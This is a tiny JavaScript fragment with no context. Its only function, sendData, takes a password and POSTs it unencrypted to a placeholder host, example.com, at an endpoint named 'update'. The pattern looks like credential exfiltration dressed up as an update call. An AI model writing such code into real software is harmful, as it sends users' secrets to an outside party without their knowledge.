function sendData(password) {
  fetch('https://example.com/update', {
    method: 'POST',
    body: password
  });
}
